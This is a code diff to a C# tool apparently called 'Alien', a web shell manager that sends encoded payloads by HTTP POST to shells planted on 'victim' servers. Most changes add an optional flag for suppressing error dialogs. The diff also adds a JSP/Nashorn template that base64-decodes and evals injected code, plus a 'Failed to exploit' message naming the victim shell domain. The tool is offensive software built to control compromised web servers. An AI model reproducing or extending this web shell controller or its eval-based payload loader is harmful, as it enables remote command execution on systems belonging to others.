@@ -275,8 +275,10 @@ namespace Alien
             {
                 enLanguage.JSP, (type) =>
                 {
+                    if (type == "Nashorn")
+                        return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
 
-                    return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
+                    return null;
                 }
             }
         };
@@ -519,7 +521,7 @@ namespace Alien
         /// <param name="szPayloadData"></param>
         /// <param name="szSplitter"></param>
         /// <returns></returns>
-        public async Task<string> fnHttpPOST(stShellConfig config, Dictionary<stShellConfig, string> dicSplitter, string szPayloadData, string szSplitter)
+        public async Task<string> fnHttpPOST(stShellConfig config, Dictionary<stShellConfig, string> dicSplitter, string szPayloadData, string szSplitter, bool bShowError = true)
         {
             HttpContent? content = null;
             HttpResponseMessage resp;
@@ -763,7 +765,9 @@ namespace Alien
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                if (bShowError)
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+
                 return string.Empty;
             }
         }
@@ -845,7 +849,7 @@ namespace Alien
             catch (Exception ex)
             {
                 if (bShowError)
-                    MessageBox.Show(ex.Message, "fnbTestWebConnection()");
+                    MessageBox.Show(ex.Message, "fnbTestWebConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                 return false;
             }
@@ -860,31 +864,31 @@ namespace Alien
             try
             {
                 string szPattern = clsEzData.fnszGenerateRandomStr();
-                string szResp = await fnszSendPayload("test", new string[] { szPattern });
+                string szResp = await fnszSendPayload("test", new string[] { szPattern }, bShowError);
 
                 bool bVal = string.Equals(szResp, szPattern);
                 if (!bVal)
-                    throw new Exception(szResp);
+                    throw new Exception(string.IsNullOrEmpty(szResp) ? "Failed to exploit: " + m_victim.m_szShellDomain : szResp);
 
                 return bVal;
             }
             catch (Exception ex)
             {
                 if (bShowError)
-                    MessageBox.Show(ex.Message, "fnbTestShellConnection()");
+                    MessageBox.Show(ex.Message, "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                 return false;
             }
         }
 
-        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
-        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
+        public async Task<string> fnszSendPayload(string szPayloadName, bool bShowError = true) => await fnszSendPayload(szPayloadName, new string[] { });
+        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams, bool bShowError = true)
         {
             if (m_victim.ShellPayloadType == enPayloadType.DarkMatter)
             {
                 // NebulaPulsar
 
-                return await fnNebulaPulsar(szPayloadName, asParams);
+                return await fnNebulaPulsar(szPayloadName, asParams, bShowError);
             }
 
             string szSplitter = clsEzData.fnszGenerateRandomStr();
@@ -976,13 +980,13 @@ namespace Alien
                     szFinalPayload = result.szComet;
                 }
 
-                return await fnHttpPOST(result.config, dicSplitter, szFinalPayload, szSplitter);
+                return await fnHttpPOST(result.config, dicSplitter, szFinalPayload, szSplitter, bShowError);
             }
 
-            return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
+            return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter, bShowError);
         }
 
-        private async Task<string> fnNebulaPulsar(string szPayloadName, string[] asParams)
+        private async Task<string> fnNebulaPulsar(string szPayloadName, string[] asParams, bool bShowError = true)
         {
             try
             {
@@ -1046,7 +1050,9 @@ namespace Alien
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                if (bShowError)
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+
                 return string.Empty;
             }
         }
